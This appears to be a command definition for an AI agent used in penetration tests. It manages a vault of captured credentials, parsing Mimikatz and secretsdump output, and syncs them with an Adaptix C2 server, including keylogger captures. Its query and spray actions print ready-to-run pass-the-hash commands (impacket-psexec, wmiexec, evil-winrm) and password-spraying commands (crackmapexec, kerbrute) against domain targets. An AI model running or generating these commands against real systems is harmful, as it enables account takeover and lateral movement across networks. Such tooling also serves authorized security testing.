Manage the engagement credential vault. $ARGUMENTS = action and credential data.

Actions:
- `/osai-cred-vault add <creds>` — log new credentials
- `/osai-cred-vault list` — show all credentials as table
- `/osai-cred-vault query <term>` — search by host/user/domain and print PTH commands
- `/osai-cred-vault spray <targets>` — print spray commands for all plaintext passwords
- `/osai-cred-vault export` — SysReptor-ready credential table

State file: ~/osai/state/creds.json (JSON array)

## Action: add
Parse free-form credential input — accepts:
- `user:pass@host`
- Mimikatz output blocks
- secretsdump lines: `domain\user:RID:LM:NTLM:::`
- key:value pairs

Load ~/osai/state/creds.json (create `[]` if missing). Check for exact duplicates (same username + secret). Append new entry:
```json
{
  "id": "<auto-increment>",
  "ts": "<ISO timestamp>",
  "host": "<hostname or IP>",
  "domain": "<domain or WORKGROUP>",
  "username": "<username>",
  "secret": "<password/hash/ticket/key>",
  "type": "<plaintext|ntlm|net-ntlmv2|aes256|aes128|rc4|tgt|st|ssh-key|api-key|token|other>",
  "source": "<secretsdump/mimikatz/LSASS/config/env/RAG/etc>",
  "valid_on": ["<host>"],
  "cracked": false,
  "notes": ""
}
```
Print: `[+] Added: DOMAIN\user — type — host`

## Action: list
Load creds.json. Print markdown table:
```
| # | Host | Domain\User | Type | Secret (truncated 30) | Source | Valid On |
```
Highlight NTLMs appearing for multiple users (reuse indicator).
Print count: `X creds total — Y plaintext, Z hashes, W tickets`

## Action: query <term>
Filter entries where host, username, domain, or source contains term (case-insensitive). Print full untruncated details. For each NTLM hash found, also print:
```bash
# Pass-the-Hash commands
impacket-psexec DOMAIN/user@TARGET -hashes :NTLM
impacket-wmiexec DOMAIN/user@TARGET -hashes :NTLM
evil-winrm -i TARGET -u user -H NTLM
```

## Action: spray <targets>
Load all unique plaintext passwords from creds.json. For each:
```bash
crackmapexec smb <targets> -u users.txt -p '<password>' --continue-on-success
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt '<password>'
```
⚠️ WARN: "Check lockout policy before spraying — default AD lockout is 5 attempts. Run: net accounts /domain"

## Action: export
Generate SysReptor-ready full credential table (no truncation). Write to ~/osai/loot/creds_export.md and print to stdout.

## Directory check
Ensure ~/osai/state/ exists: `mkdir -p ~/osai/state/`
On parse errors: print the raw line and ask user to confirm format — never silently drop data.

## Adaptix sync (when Adaptix MCP is active)
When adding credentials, also sync to Adaptix credential manager so they appear in the C2 UI:
```
add_credential(
  username="<user>",
  password="<secret>",
  realm="<domain>",
  cred_type="plaintext",   # or "ntlm", "aes256", etc.
  host="<host>",
  tag="chain1"
)
```
To pull creds Adaptix already captured (e.g. from agent keylogger or credential harvest):
```
list_credentials()
```
Then add any new ones to ~/osai/state/creds.json with the 'add' action to keep both stores in sync.
